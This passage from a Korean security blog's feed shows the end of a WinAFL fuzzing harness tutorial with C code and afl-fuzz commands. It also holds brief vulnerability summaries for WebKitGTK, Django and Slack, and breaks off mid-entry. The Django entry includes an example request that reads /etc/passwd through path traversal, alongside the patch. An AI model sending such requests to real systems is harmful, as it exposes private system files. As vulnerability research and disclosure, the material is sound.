&#xAD49;&#xC7A5;&#xD788; &#xAC15;&#xC870;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; Harness&#xB97C; &#xB611;&#xBC14;&#xB85C; &#xC791;&#xC131;&#xD588;&#xC744; &#xB54C;&#xC758; &#xC774;&#xC57C;&#xAE30;&#xC785;&#xB2C8;&#xB2E4;. &#xC81C;&#xAC00; &#xC791;&#xC131;&#xD55C; Harness&#xCC98;&#xB7FC; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xB2E4;&#xBA74; &#xC624;&#xD788;&#xB824; WinAFL&#xC758; &#xC800;&#xB7F0; &#xD2B9;&#xC9D5;&#xB4E4;&#xC774; &#xB3C5;&#xC774; &#xB418;&#xC11C; &#xBC18;&#xB300;&#xB85C; &#xD37C;&#xC9D5; &#xC18D;&#xB3C4;&#xAC00; &#xADF9;&#xC545;&#xBB34;&#xB3C4;&#xD558;&#xAC8C; &#xB290;&#xB824;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h1 id="&#xADF8;&#xB798;&#xC11C;-&#xBB50;&#xAC00;-&#xBB38;&#xC81C;&#xC778;&#xAC00;"><a href="#&#xADF8;&#xB798;&#xC11C;-&#xBB50;&#xAC00;-&#xBB38;&#xC81C;&#xC778;&#xAC00;" class="headerlink" title="&#xADF8;&#xB798;&#xC11C; &#xBB50;&#xAC00; &#xBB38;&#xC81C;&#xC778;&#xAC00;"></a>&#xADF8;&#xB798;&#xC11C; &#xBB50;&#xAC00; &#xBB38;&#xC81C;&#xC778;&#xAC00;</h1><p>&#xC704;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD55C; &#xAC83;&#xCC98;&#xB7FC; iteration&#xC744; &#xD560; &#xB54C; &#xBA87;&#xBA87; &#xB9AC;&#xC18C;&#xC2A4;&#xAC00; &#xC5EC;&#xC804;&#xD788; &#xC0AC;&#xC6A9; &#xC911;&#xC774;&#xB77C;&#xBA74; &#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; WinAFL&#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD569;&#xB2C8;&#xB2E4;. &#xD0C0;&#xAC9F;&#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; input &#xD30C;&#xC77C;&#xC774; &#xC81C;&#xB300;&#xB85C; &#xB2EB;&#xD788;&#xC9C0; &#xC54A;&#xC740; &#xAC83;&#xC774; &#xBB38;&#xC81C;&#xC778; &#xAC83; &#xAC19;&#xC544;&#xC11C; &#xBD84;&#xC11D;&#xD574; &#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. ( &#xB124;, &#xC774;&#xB54C;&#xC11C;&#xC57C; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Harness&#xAC00; &#xB611;&#xBC14;&#xB85C; &#xB3D9;&#xC791;&#xC548;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xB2F9;&#xC5F0;&#xD558;&#xC9C0;&#x2026; )</p><p><img src="/2021/06/13/fabu1ous/winafl-2/6.png" alt></p><p>&#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xC5D0;&#xB294; 2&#xAC00;&#xC9C0; &#xBB38;&#xC81C;&#xC810;&#xC774; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8;, input &#xD30C;&#xC77C;&#xC744; &#xB450; &#xBC88; &#xC5F4;&#xACE0; &#xB2EB;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB294; &#xD30C;&#xC77C;&#xC758; &#xC190;&#xC0C1;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xADF8;&#xC5D0; &#xB9DE;&#xB294; &#xD578;&#xB4E4; &#xBC88;&#xD638;&#xB97C; &#xB9AC;&#xD134;&#xD558;&#xB294;&#xB370; &#xC6B0;&#xC120; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4; &#xD30C;&#xC77C; &#xC2DC;&#xADF8;&#xB2C8;&#xCCD0;&#xB97C; &#xC77D;&#xACE0; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xD30C;&#xC77C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xAC00; &#xC720;&#xD6A8;&#xD558;&#xB2E4;&#xBA74; &#xC11C;&#xBE0C; &#xB8E8;&#xD2F4;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; &#xD55C;&#xBC88; &#xB354; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4; &#xD30C;&#xC2F1; &#xD558;&#xACE0; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. Part1&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xB300;&#xB85C; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xAC00; &#xB9CC;&#xC871;&#xD574;&#xC57C; &#xD560; &#xC870;&#xAC74;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; input &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4;&#xC57C; &#xD568;</li><li>&#xADF8; &#xD30C;&#xC77C;&#xC744; &#xD30C;&#xC2F1; &#xD574;&#xC57C; &#xD568;</li><li>&#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; input &#xD30C;&#xC77C;&#xC744; &#xB2EB;&#xC544;&#xC57C; &#xD568;</li><li>&#xB9AC;&#xD134;&#xAE4C;&#xC9C0; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xC5B4;&#xC57C; &#xD568;</li></ol><p>&#xC5EC;&#xAE30;&#xC11C; 3&#xBC88; &#xACFC;&#xC815;&#xC774; &#xC911;&#xC694;&#xD55C;&#xB370; Harness&#xAC00; &#xD30C;&#xC77C;&#xC744; &#xB2EB;&#xC544;&#xC57C; WinAFL&#xC774; &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>WinAFL&#xC774; &#xD30C;&#xC77C;&#xC744; mutate &#xD558;&#xAE30; &#xC704;&#xD574; &#xC811;&#xADFC;&#xD558;&#xC9C0;&#xB9CC; Harness&#xAC00; &#xB2E4;&#xC2DC; &#xC0AC;&#xC6A9;&#xD574; &#xC2E4;&#xD328;&#xD558;&#xAC8C; &#xB418;&#xACE0; &#xAC15;&#xC81C;&#xB85C; Harness&#xB97C; &#xC885;&#xB8CC;&#xC2DC;&#xD0A4;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB450; &#xBC88;&#xC9F8;, &#xCC98;&#xC74C; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5C8;&#xC744; &#xB54C; &#xD30C;&#xC77C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98; &#x201C;4 byte&#x201D;&#xB9CC; &#xC77D;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD37C;&#xC9D5;&#xC5D0; &#xC758;&#xBBF8; &#xC5C6;&#xB294; &#xB3D9;&#xC791;&#xC785;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB97C; &#xC870;&#xAE08;&#xC774;&#xB77C;&#xB3C4; &#xBD84;&#xC11D;&#xD588;&#xC73C;&#xBA74; &#xC774;&#xB7F0; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xC744; &#xD150;&#xB370;&#x2026;</p><h1 id="Harness"><a href="#Harness" class="headerlink" title="Harness"></a>Harness</h1><p>&#xBB38;&#xC81C;&#xC810;&#xC744; &#xC54C;&#xC544;&#xB0C8;&#xC73C;&#xB2C8; Harness&#xB97C; &#xC218;&#xC815;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;. &#xC6B0;&#xC120; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB97C; &#xBCC0;&#xACBD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE30;&#xC874; &#xD0C0;&#xAC9F; &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0; &#xC788;&#xB358; &#xC11C;&#xBE0C; &#xB8E8;&#xD2F4;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC758; &#xC544;&#xCE74;&#xC774;&#xBE0C; &#xD5E4;&#xB354;&#xB97C; &#xC77D;&#xC5B4;&#xC640; &#xD30C;&#xC2F1; &#xD558;&#xACE0; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC0C8;&#xB85C;&#xC6B4; &#xD0C0;&#xAC9F; &#xD568;&#xC218;&#xB294; vtable&#xC744; &#xC778;&#xC790;&#xB85C; &#xBC1B;&#xC544; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; <code>__thiscall</code> &#xD638;&#xCD9C; &#xADDC;&#xC57D;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xADF8;&#xC5D0; &#xB9DE;&#xAC8C; &#xCF54;&#xB4DC;&#xB97C; &#xC218;&#xC815;&#xD574; &#xC92C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(__thiscall *TARGET)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* vp, <span class="hljs-keyword">wchar_t</span>* filename)</span></span>;TARGET target;<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(__thiscall *OPERATE)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* vp)</span></span>;OPERATE pre_target;OPERATE post_target;OPERATE filecl;<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) __declspec(noinline) <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fuzzme</span><span class="hljs-params">(<span class="hljs-keyword">int</span>* vp, <span class="hljs-keyword">wchar_t</span>* path)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">int</span> result = target(vp, path);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result: %d\\n&quot;</span>, result);filecl(vp);<span class="hljs-keyword">return</span> result;}<span class="hljs-function"><span class="hljs-keyword">wchar_t</span>* <span class="hljs-title">charToWChar</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* text)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">size_t</span> size = <span class="hljs-built_in">strlen</span>(text) + <span class="hljs-number">1</span>;<span class="hljs-keyword">wchar_t</span>* wa = (<span class="hljs-keyword">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">wchar_t</span>) * size);mbstowcs(wa, text, size);<span class="hljs-keyword">return</span> wa;}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">int</span> vp[<span class="hljs-number">32</span>];SetDllDirectory(<span class="hljs-string">&quot;...&quot;</span>); <span class="hljs-comment">// Dll &#xACBD;&#xB85C;</span>HMODULE DLLHandle = LoadLibrary(<span class="hljs-string">&quot;TargetDll.dll&quot;</span>);<span class="hljs-keyword">if</span> (DLLHandle == <span class="hljs-number">0</span>){<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot load TargetDll.dll\\n&quot;</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\\n&quot;</span>, DLLHandle);target = (TARGET)DLLHandle + <span class="hljs-number">0x1500</span>;filecl = (OPERATE)DLLHandle + <span class="hljs-number">0x16e0</span>;pre_target = (OPERATE)DLLHandle + <span class="hljs-number">0x1000</span>;post_target = (OPERATE)DLLHandle + <span class="hljs-number">0x10c0</span>;pre_target(vp);<span class="hljs-keyword">int</span> result = fuzzme(vp, charToWChar(argv[<span class="hljs-number">1</span>]));post_target(vp);<span class="hljs-keyword">return</span> result;}</code></pre><p><img src="/2021/06/13/fabu1ous/winafl-2/7.png" alt></p><p>&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC885;&#xB8CC; &#xBB38;&#xC81C;&#xAC00; &#xC0AC;&#xB77C;&#xC84C;&#xACE0; &#xCD08;&#xB2F9; 90&#xBC88; &#xC815;&#xB3C4; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;. WinAFL&#xC740; &#xC5EC;&#xC804;&#xD788; &#xB290;&#xB9AC;&#xB2E4;&#xACE0; &#xBD88;&#xD3C9;&#xD558;&#xC9C0;&#xB9CC; 3&#xCD08;&#xC5D0; 1&#xBC88; &#xC2E4;&#xD589;&#xD558;&#xB358; &#xC774;&#xC804; &#xBC84;&#xC804;&#xBCF4;&#xB2E8; &#xD6E8;&#xC52C; &#xAD1C;&#xCC2E;&#xC740; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB34;&#xC5C7;&#xBCF4;&#xB2E4; bff&#xC5D0; &#xBE44;&#xD558;&#xBA74; &#xC5C4;&#xCCAD;&#xB098;&#xAC8C; &#xBE60;&#xB978; &#xAC70;&#xB77C; &#xC800;&#xB294; &#xB9CC;&#xC871;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="&#xBCD1;&#xB82C;-&#xCC98;&#xB9AC;"><a href="#&#xBCD1;&#xB82C;-&#xCC98;&#xB9AC;" class="headerlink" title="&#xBCD1;&#xB82C; &#xCC98;&#xB9AC;"></a>&#xBCD1;&#xB82C; &#xCC98;&#xB9AC;</h1><p>&#xCF54;&#xC5B4; &#xAC2F;&#xC218;&#xB9CC;&#xD07C; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xB3CC;&#xB9B4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs apache"><span class="hljs-attribute">afl</span>-fuzz.exe -i in -o out -M fuzzer<span class="hljs-number">01</span> -D <span class="hljs-string">&quot;%DynamoRIO&#xACBD;&#xB85C;%\\bin32&quot;</span> -t <span class="hljs-number">10000</span> -- -coverage_module TargetDll.dll -target_module harness.exe -target_method fuzzme -fuzz_iterations <span class="hljs-number">5000</span> -nargs <span class="hljs-number">2</span> -- <span class="hljs-string">&quot;%harness&#xACBD;&#xB85C;%harness.exe&quot;</span> @@<span class="hljs-attribute">afl</span>-fuzz.exe -i in -o out -S fuzzer<span class="hljs-number">02</span> -D <span class="hljs-string">&quot;%DynamoRIO&#xACBD;&#xB85C;%\\bin32&quot;</span> -t <span class="hljs-number">10000</span> -- -coverage_module TargetDll.dll -target_module harness.exe -target_method fuzzme -fuzz_iterations <span class="hljs-number">5000</span> -nargs <span class="hljs-number">2</span> -- <span class="hljs-string">&quot;%harness&#xACBD;&#xB85C;%harness.exe&quot;</span> @@</code></pre><p><img src="/2021/06/13/fabu1ous/winafl-2/8.png" alt></p><p>8 &#xCF54;&#xC5B4;&#xB77C;&#xC11C; 8&#xAC1C; &#xB3CC;&#xB9AC;&#xB294; &#xC911;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xB984;&#xB2F5;&#xC2B5;&#xB2C8;&#xB2E4;. harness &#xC218;&#xC815;&#xD558;&#xAE30; &#xC804;&#xC5D0;&#xB294; CPU 40% &#xC815;&#xB3C4; &#xC4F0;&#xB358;&#xB370; &#xC9C0;&#xAE08;&#xC740; 83%~88%&#xB97C; &#xCC0D;&#xB294; &#xAC70; &#xBCF4;&#xB2C8; &#xAE30;&#xBD84;&#xB3C4; &#xC88B;&#xB124;&#xC694;.</p><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p>&#xC74C;&#x2026; &#xBB54;&#xAC00; &#xC5C4;&#xCCAD; &#xAE38;&#xC5B4;&#xC9C8; &#xAC70;&#xB77C; &#xC0DD;&#xAC01;&#xD574;&#xC11C; Part 2&#xB85C; &#xB098;&#xB204;&#xAE34; &#xD588;&#xB294;&#xB370; &#xC544;&#xBB34;&#xB798;&#xB3C4; &#xC2E4;&#xC81C; &#xC0C1;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xBD84;&#xC11D;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xC0C1;&#xC138;&#xD558;&#xAC8C; &#xC801;&#xC744; &#xC218; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAE00;&#xC774; &#xB9CE;&#xC774; &#xC9E7;&#xC544;&#xC9C4; &#xAC70; &#xAC19;&#xB124;&#xC694;. &#xAE00;&#xB85C; &#xBCF4;&#xBA74; &#xC9E7;&#xC740;&#xB370; &#xC800;&#xC758; &#xC0BD;&#xC9C8;&#xC740; &#xC5C4;&#xCCAD; &#xAE38;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#x314E;&#x314E;. Harness&#xB97C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xD574;&#xC8FC;&#xB294; winnie-AFL&#xC774;&#xB780; &#xAC83;&#xB3C4; &#xC788;&#xB358;&#xB370; &#xB2E4;&#xC74C; &#xAE00;&#xC740; &#xC544;&#xB9C8; winnie-AFL&#xC5D0; &#xAD00;&#xD55C; &#xAE00;&#xC774; &#xB420; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzzing</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>winafl</tag>
      
      <tag>harness</tag>
      
      <tag>bug bounty</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21779: Webkit Webcore use-after-free</title>
    <link href="/2021/06/12/fabu1ous/2021-06-12/"/>
    <url>/2021/06/12/fabu1ous/2021-06-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2021-1238">Webkit WebCore::GraphicsContext use-after-free vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>WebKitGTK 2.30.4</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>WebkitGTK 2.30.4&#xC758; GraphicsContext&#xB294; &#xD2B9;&#xC815; &#xC774;&#xBCA4;&#xD2B8;&#xB97C; &#xD578;&#xB4E4; &#xD560; &#xB54C; use-after-free &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. Webkit&#xC740; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xC6F9; &#xCF58;&#xD150;&#xCE20; &#xC5D4;&#xC9C4;&#xC73C;&#xB85C; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB97C; &#xBE44;&#xB86F;&#xD55C; &#xC5EC;&#xB7EC; &#xC751;&#xC6A9;&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Webkit&#xC758; <code>fillText()</code> &#xD568;&#xC218;&#xB294; HTMLCanvasElement &#xB0B4;&#xBD80; &#xD2B9;&#xC815; &#xC88C;&#xD45C;&#xC5D0; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;. HTMLCanvasElement&#xB294; <code>m_width</code>&#xC640; <code>m_height</code>&#xAC12;&#xC744; &#xAC16;&#xACE0; &#xC788;&#xB294;&#xB370; &#xC774;&#xC5D0; &#xB9DE;&#xCDB0; <code>fillText()</code> &#xD568;&#xC218;&#xAC00; &#xCD9C;&#xB825;&#xD560; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xC88C;&#xD45C;&#xAC00; &#xC720;&#xD6A8;&#xD55C; &#xBC94;&#xC704; &#xB0B4;&#xC5D0; &#xC788;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>HTMLCanvasElement&#xB294; &#xBC31;&#xADF8;&#xB77C;&#xC6B4;&#xB4DC;&#xC5D0;&#xC11C; &#xC218;&#xD589;&#xB41C; &#xBCC0;&#xACBD; &#xC0AC;&#xD56D;&#xC5D0; &#xB530;&#xB77C; <code>m_height</code> &#xAC12;&#xC744; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xC9C0;&#xB9CC; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xAE30; &#xC774;&#xC804;&#xC758; <code>m_height</code>&#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; <code>fillGradient()</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA74; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xAE30; &#xC774;&#xC804;&#xC758; &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD560;&#xB2F9; &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD55C; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xC811;&#xC18D;&#xD560; &#xACBD;&#xC6B0; information leak &#xBC0F; &#xCD94;&#xAC00; memory corruption&#xC5D0; &#xC758;&#xD55C; &#xD53C;&#xD574;&#xB97C; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>uaf</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>use after free</tag>
      
      <tag>webkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-33203: Django path traversal vulnerability</title>
    <link href="/2021/06/11/l0ch/2021-06-11/"/>
    <url>/2021/06/11/l0ch/2021-06-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">GHSL-2021-075: Path injection in Django - CVE-2021-33203</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tested version: Django 3.2.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD30C;&#xC774;&#xC36C;&#xC5D0;&#xC11C; &#xC791;&#xC131;&#xB41C; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xC6F9; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C; Django&#xC5D0;&#xC11C; path traversal &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>django.contrib.admindocs</code> &#xBAA8;&#xB4C8;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5C8;&#xC744; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateDetailView</span>(<span class="hljs-params">BaseAdminDocsView</span>):</span>...<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span>(<span class="hljs-params">self, **kargs</span>):</span>...template_file = Path(directory) / template<span class="hljs-keyword">if</span> template_file.exists():template_contents = template_file.read_text()...</code></pre><p><code>get_context_data()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD574;&#xCEE4;&#xB294; template &#xBCC0;&#xC218;&#xB97C; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC774;&#xB97C; &#xBCC4;&#xB2E4;&#xB978; &#xAC80;&#xC99D; &#xC5C6;&#xC774; Path join &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; template directory &#xC678;&#xBD80; &#xACBD;&#xB85C;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC81C;&#xACF5;&#xD560; &#xC218; &#xC788;&#xC5B4; <code>http://localhost:8000/admin/doc/templates//etc/passwd/</code>&#xC640; &#xAC19;&#xC740; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xB0B4; &#xC784;&#xC758; &#xACBD;&#xB85C;&#xC758; &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC774; &#xB80C;&#xB354;&#xB9C1; &#xBA54;&#xC11C;&#xB4DC;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5B4; &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC774; &#xC720;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>safe_join</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xACBD;&#xB85C;&#xB97C; &#xD569;&#xCE58;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">template_file = Path(safe_join(directory, template))</code></pre><p>&#xC790;&#xC138;&#xD55C; &#xD328;&#xCE58; &#xD788;&#xC2A4;&#xD1A0;&#xB9AC;&#xB294; <a href="https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db">https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db</a> &#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>path traversal</tag>
      
      <tag>django</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 헤더 수정을 통한 Slack infra metadata 유출</title>
    <link href="/2021/06/10/idioth/2021-06-10/"/>
    <url>/2021/06/10/idioth/2021-06-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/727330">Header modification results in disclosure of Slack infra metadata to unauthorized parties</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Slack</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xAE30;&#xBC18; &#xD300; &#xD611;&#xC5C5; &#xB3C4;&#xAD6C; Slack&#xC758; <em>files.slack.com</em> &#xB3C4;&#xBA54;&#xC778;&#xC5D0;&#xC11C; &#xD638;&#xC2A4;&#xD2B8; &#xD5E4;&#xB354; &#xB300;&#xC2E0; <code>X-Forwarded-Host</code> &#xD5E4;&#xB354;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; infra metadata&#xB97C; &#xC720;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD638;&#xC2A4;&#xD2B8;&#xAC00; <em>files.slack.com</em>&#xC774; &#xC544;&#xB2D0; &#xB54C;, &#xD574;&#xB2F9; URL&#xC740; 